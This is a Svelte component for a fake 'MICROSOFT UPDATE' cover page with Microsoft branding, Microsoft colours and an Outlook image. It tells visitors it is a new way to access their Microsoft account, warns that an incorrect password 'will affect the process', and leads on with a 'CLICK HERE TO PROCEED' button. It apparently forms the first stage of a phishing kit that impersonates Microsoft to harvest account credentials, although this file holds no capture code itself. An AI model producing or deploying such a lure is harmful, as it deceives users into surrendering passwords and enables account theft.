<script>
  import { createEventDispatcher } from 'svelte';
  import MicrosoftOutlook from '../assets/Microsoft-outlook.jpg';

  const dispatch = createEventDispatcher();

  function handleClick() {
    dispatch('proceed');
  }
</script>
<div class="coverpage-background-style">

  <div class="coverpage-content">
    <h1 class="coverpage-header-white">MICROSOFT UPDATE</h1>

    <p class="coverpage-text">
      A new way to access your Microsoft Account. 
      Inputting an incorrect password will affect the process...
    </p>

    <button class="coverpage-button-blue" on:click={handleClick}>
      CLICK HERE TO PROCEED
    </button>

    <img class="coverpage-image" src={MicrosoftOutlook} alt="Microsoft Outlook"/>
  </div>

</div>

<style>
/* .coverpage-background-style {
    min-height: 100vh;
    width: 100%;
    
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    gap: 30px;
    text-align: center;

    background:
        radial-gradient(circle at 20% 30%, rgba(255,255,255,0.15) 0%, transparent 40%),
        radial-gradient(circle at 80% 70%, rgba(255,255,255,0.1) 0%, transparent 40%),
        linear-gradient(135deg, #0078D4 0%, #005A9E 40%, #003C70 100%);
    
    color: white;
} */



/* .coverpage-background-style {
    min-height: 100vh;
    width: 100%;
    
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    gap: 30px;
    text-align: center;
    
    background: linear-gradient(
        180deg,
        #0078D4 0%,
        #2B88D8 40%,
        #FFFFFF 100%
        );
        } */
        
        .coverpage-background-style {
    min-height: 100vh;
    width: 100%;

    display: flex;
    justify-content: center;
    /* align-items: center; */

    background: linear-gradient(
        160deg,
        #0078D4 50%,
        #ffffff 50%
    );
}

.coverpage-content {
    display: flex;
    flex-direction: column;
    align-items: center;
    text-align: center;
    gap: 25px;
    max-width: 600px;
    padding: 20px;
}

.coverpage-header-white {
    color: white;
    margin: 0;
}

.coverpage-text {
    color: white;
    max-width: 500px;
}

.coverpage-button-blue {
    border-radius: 3px;
    background: white;
    color: #0078D4;
    padding: 10px 20px;
    border: none;
    cursor: pointer;
}

.coverpage-button-blue:hover {
    transform: scaleY(1.03);
}

.coverpage-button-blue:focus {
    outline: none;
}

.coverpage-image {
    width: 400px;
    height: auto;
    margin-top: 10px;
}

</style>